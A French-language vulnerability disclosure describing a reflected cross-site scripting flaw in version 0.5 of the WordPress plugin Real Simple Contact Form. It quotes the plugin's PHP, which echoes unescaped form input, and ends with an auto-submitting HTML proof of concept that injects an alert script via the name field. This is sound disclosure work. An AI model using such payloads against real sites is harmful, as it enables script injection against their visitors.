---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Real Simple Contact Form"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Real Simple Contact Form](https://wordpress.org/plugins/real-simple-contact-form/) se présente de cette façon :

> Create contact form easily for wordpress blog. No fancy settings. Just install plugin and contact form is ready.

La version testée est la 0.5 et date d'il y a 12 ans au moment de ces lignes.

## La vulnérabilité

Dans le script principal `real-simple-contact-form.php` on trouve un hook qui va se charger de créer un nouveau post sur le blog :

```php
register_activation_hook(__FILE__,"create_contact_page");
```

Le post en question le voici :

```php
/*Create contact form*/
function create_contact_page ()
{
    global $user_ID;

    $page['post_type']    = 'page';
    $page['post_content'] = '[realsimplecontactform]';
    $page['post_parent']  = 0;
    $page['post_author']  = $user_ID;
    $page['post_status']  = 'publish';
    $page['post_title']   = 'Contact Us';
    $pageid = wp_insert_post ($page);
    if ($pageid == 0) { /* Page Add Failed */ }
}
```

Le contenu `[realsimplecontactform]` correspond à un shortcode que le plugin définit aussi :

```php
/*Add short code*/
add_shortcode( 'realsimplecontactform', 'contact_form_function' );
```

C'est cette fonction (qui sera appelée quand le shortcode est croisé par Wordpress) qui est vulnérable :

```php
/*Add contact form*/
function contact_form_function( $atts ) {

    if (isset($_POST['real_simple_contact_form_data']))
    {
        if (empty($_POST['contact_name']))
        {
            echo "Please Enter Name";
        }
        elseif (empty($_POST['contact_email']))
        {
            echo "Please Enter Email Address";
        }
        elseif (!filter_var($_POST['contact_email'], FILTER_VALIDATE_EMAIL)) {
            echo "Please Enter Correct Email Address";
        }
        elseif (empty($_POST['contact_subject']))
        {
            echo "Please Enter Subject";
        }
        elseif (empty($_POST['contact_desc']))
        {
            echo "Please Enter Description";
        }
        else {
            /*everything ok.. lets process */
            $name = $_POST['contact_name'];
            $email_id = $_POST['contact_email'];
            $subject = $_POST['contact_subject'];
            $desc = $_POST['contact_desc'];
            $retmsg = process_contact_form($name,$email_id,$subject,$desc);
        }

        $name = $_POST['contact_name'];
        $email_id = $_POST['contact_email'];
        $subject = $_POST['contact_subject'];
        $desc = $_POST['contact_desc'];

    }
    else {                                                                                                                     $name = "";
        $email_id = "";
        $subject = "";
        $desc = "";
    }

?>

        <form method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">
        <p>Name : <br />
    <input style="width:250px;" name="contact_name" type="text" value="<?php echo $name; ?>" /> <br />
        <p>Email Address : <br />
    <input style="width:250px;" name="contact_email" type="text" value="<?php echo $email_id; ?>" /><br />
        <p>Subject : <br />
    <input style="width:250px;" name="contact_subject" type="text" value="<?php echo $subject; ?>" /><br />
        <p>Description : <br />
    <textarea name="contact_desc" rows="8" cols="50" ><?php echo $desc; ?></textarea>         <br />
<!--    <?php wp_nonce_field('ecfa261455','ecfnf'); ?> -->

      <div class="submit">
        <input type="submit" name="real_simple_contact_form_data" value="<?php echo 'Send'; ?>" />
        </div>
        <hr />
    </form>

<?php
}
```

On voit qu'en cas d'erreur de saisie sur le formulaire de contact, les données reçues sont remises dans les champs pour que l'utilisateur n'ait pas à les retaper, ce qui est très bien.

Sauf que... aucun filtrage n'est fait sur la nature des données soumises qui sont affichées telles quelles et ouvrent la porte à une vulnérabilité XSS.

PoC :

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/?page_id=6">
        <input type="hidden" name="contact_name" value="&quot;&gt;&lt;ScRiPt&gt;alert(/XSS/)&lt;/sCrIpT&gt;" />
        <input type="hidden" name="contact_email" value="whatever" />
        <input type="hidden" name="contact_subject" value="default" />
        <input type="hidden" name="real_simple_contact_form_data" value="Send" />
        <input type="hidden" name="contact_desc" value="Hi there!" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```
